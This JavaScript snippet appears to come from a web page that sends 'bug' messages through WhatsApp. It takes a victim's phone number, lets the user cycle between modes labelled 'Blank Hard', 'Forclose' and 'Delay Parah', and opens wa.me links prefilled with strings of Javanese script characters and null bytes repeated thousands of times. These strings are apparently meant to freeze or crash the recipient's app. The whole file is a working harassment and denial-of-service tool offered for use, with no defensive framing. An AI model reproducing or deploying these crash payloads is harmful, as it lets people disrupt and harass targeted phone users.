(function(){
      const target = document.getElementById('target');
      const methodBtn = document.getElementById('methodBtn');
      const send = document.getElementById('send');

      const modes = ['blank', 'forclose', 'delay'];
      const labels = {
        blank: 'Blank Hard ⚠︎︎',
        forclose: 'Forclose 24j ❆︎',
        delay: 'Delay Parah ☢︎'
      };
      const texts = {
        blank: '𝐕𝐗𝐙𝟏' + 'ꦾ𝐗ꦽꦽ'.repeat(7555),
        forclose: '𝐕𝐗𝐙𝟐' + ('ꦾ𝐙\u0000ꦽ').repeat(7555),
        delay: '𝐕𝐗𝐙𝟑' + 'ꦾ𝐙$'.repeat(9670) + '\n' + 'ꦽ'.repeat(9999)
      };

      let mode = 'blank';

      methodBtn.addEventListener('click', () => {
        const i = modes.indexOf(mode);
        mode = modes[(i + 1) % modes.length];
        methodBtn.textContent = labels[mode];
      });

      function sanitizeNumber(v){
        return v.replace(/[^0-9]/g, '');
      }

      send.addEventListener('click', () => {
        const num = sanitizeNumber(target.value.trim());
        if(!num){
          alert('Masukkan nomor target yang valid.');
          return;
        }
        const msg = encodeURIComponent(texts[mode]);
        window.open(`https://wa.me/${num}?text=${msg}`, '_blank');
      });
    })();
